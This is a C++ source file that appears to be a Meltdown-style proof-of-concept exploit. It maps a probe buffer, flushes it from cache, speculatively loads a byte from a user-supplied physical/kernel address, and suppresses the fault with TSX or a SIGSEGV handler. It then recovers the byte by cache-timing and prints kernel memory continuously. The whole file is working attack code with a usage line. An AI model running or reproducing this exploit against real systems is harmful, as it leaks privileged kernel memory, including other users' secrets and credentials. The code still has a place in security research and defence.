#include <cstdio>
#include <unordered_map>
#include <array>
#include <string>
#include <fstream>
#include <iostream>
#include <sstream>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <memory>
#include <limits>
#include <algorithm>
#include <sys/mman.h>
#include <errno.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <signal.h>
#include <ucontext.h>
#include <sys/syscall.h>
#include "assembly_utils.hh"

static constexpr size_t read_retries = 5;
static constexpr size_t total_pages = 256;
static bool g_tsx_supported = false;
static const size_t g_cache_hit_threshold = 80;

static inline unsigned page_size() {
    static unsigned __page_size = 0;
    if (!__page_size) {
        __page_size = getpagesize();
    }
    return __page_size;
}

static inline unsigned mem_size() {
    return total_pages * page_size();
}

static void transaction_trap_mitigation(int cause, siginfo_t* info, void* uap) {
    ucontext_t* context = reinterpret_cast<ucontext_t*>(uap);
#ifdef __x86_64__
    context->uc_mcontext.gregs[REG_RIP] = (uintptr_t)__speculative_byte_load_exit;
#else
    context->uc_mcontext.gregs[REG_EIP] = (uintptr_t)__speculative_byte_load_exit;
#endif
}

static inline void setup_transaction_trap_mitigation() {
    struct sigaction sa;
    sa.sa_sigaction = transaction_trap_mitigation;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_SIGINFO;
    if (sigaction(SIGSEGV, &sa, 0)) {
        perror("sigaction");
        exit(1);
    }
}

size_t phys_to_virt(size_t addr,size_t physical_offset) {
  /* we are given full address (kernel or physical) here */
  if (addr + physical_offset < physical_offset)
    return addr;

  return addr + physical_offset;
}



static uint8_t read_address_byte(uintptr_t target_address, char* pages, int& status) {
    std::array<unsigned long, total_pages> index_heat;
    index_heat.fill(0);

    static constexpr size_t max_useless_iterations = 50000;
    size_t useless_iterations = 0;

    for (auto r = 0; r < read_retries;) {
        for (auto i = 0; i < total_pages; i++) {
            __clflush(&pages[i * page_size()]);
        }

        syscall(0, 0, 0, 0);

        if (g_tsx_supported) {
            if (_xbegin() == _XBEGIN_STARTED) {
                __speculative_byte_load(target_address, pages);
                _xend();
            } else {
            }
        } else {
            __speculative_byte_load(target_address, pages);
        }

        static_assert(total_pages <= std::numeric_limits<uint8_t>::max()+1, "total_pages will overflow index");
        bool incr = false;
        for (auto i = 0; i < total_pages; i++) {
            auto duration = __measure_load_execution(&pages[i * page_size()]);

            if (duration <= g_cache_hit_threshold) {
                if (!incr){
                    status = 0;
                    useless_iterations = 0;
                    r++;
                    incr = true;
                }
                index_heat[i]++;
            }
        }
        if (!incr && useless_iterations++ == max_useless_iterations) {
            status = (r) ? 0 : -1;
            break;
        }
    }
    return std::distance(index_heat.begin(), std::max_element(index_heat.begin(), index_heat.end()));
}

static inline bool has_TSX() {
    static constexpr int hle_mask = 1<<4;
    static constexpr int rtm_mask = 1<<11;

    unsigned eax = 7;
    unsigned ebx = 0;
    unsigned ecx = 0;
    __cpu_id(eax, ebx, ecx);

    bool has_hle = (ebx & hle_mask) != 0;
    bool has_rtm = (ebx & rtm_mask) != 0;

    return (has_hle && has_rtm);
}

int main(int argc, char** argv) {

    size_t phys;
    if (argc < 2) {
        printf("Usage: %s <physical address> [<direct physical map>]\n", argv[0]);
        return 0;
    }

    phys = strtoull(argv[1], NULL, 0);

    size_t physical_offset = strtoull(argv[2], NULL, 0);

    size_t vaddr = phys_to_virt(phys, physical_offset);
    printf("0x%016lx\n", vaddr);

    printf("\x1b[32;1m[+]\x1b[0m Physical address       : \x1b[33;1m0x%zx\x1b[0m\n", phys);
    printf("\x1b[32;1m[+]\x1b[0m Physical offset        : \x1b[33;1m0x%zx\x1b[0m\n", physical_offset);
    printf("\x1b[32;1m[+]\x1b[0m Reading virtual address: \x1b[33;1m0x%zx\x1b[0m\n\n", vaddr);

    bool affected = false;
    g_tsx_supported = has_TSX();

    if (!g_tsx_supported) {
        printf("Transactional Memory not supported\n");
        setup_transaction_trap_mitigation();
    }

    auto mem = static_cast<char*>(mmap(nullptr, mem_size(), PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0));
    if (mem == MAP_FAILED) {
        printf("mmap() failed: %s\n", strerror(errno));
        return -1;
    }

    while (1) {
        int status = 0;
        int value = (int)read_address_byte((uintptr_t)vaddr, mem, status);
        if(status == -1){
            
        }
        else{
            printf("%c", value);
            fflush(stdout);
            vaddr++;
        }
        
      }

    return 0;
}